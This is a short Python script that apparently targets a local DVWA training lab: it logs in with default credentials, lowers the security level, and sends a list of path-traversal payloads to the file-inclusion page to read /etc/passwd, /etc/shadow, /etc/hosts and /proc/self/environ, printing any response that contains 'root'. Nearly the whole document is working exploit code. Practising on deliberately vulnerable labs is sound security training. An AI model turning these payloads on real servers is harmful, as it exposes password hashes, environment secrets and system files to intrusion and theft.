import re
import requests


_url = "http://localhost/dvwa"
user = "admin"
password = "password"
payloads = [
    "../../../../../..//etc/passwd",
    "../../../../../..//etc/hosts",
    "../../../etc/shadow",
    "../../../../../../proc/self/environ",
    "....//....//....//....//etc/passwd",
]

TOKEN  = re.compile(r'name=[\'"]user_token[\'"][^>]*value=[\'"]([^\'"]+)[\'"    ]')

def get_token(html: str) -> str:
    m = TOKEN.search(html)
    return m.group(1)

with requests.Session() as sess:
    login_page = sess.get(f"{_url}/login.php", timeout=5)
    token = get_token(login_page.text)


    r = sess.post(f"{_url}/login.php", data={
        "username": user,
        "password": password,
        "user_token": token,
        "Login": "Login"
    }, timeout=5)

    sec_page = sess.get(f"{_url}/security.php", timeout=5)
    token = get_token(sec_page.text)
    sess.post(f"{_url}/security.php", data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }, timeout=5)

    for p in payloads:
        resp = sess.get(f"{_url}/vulnerabilities/fi/?page={p}")
        if "root" in resp.text.lower():
            print("\n".join(resp.text.splitlines()[:25]))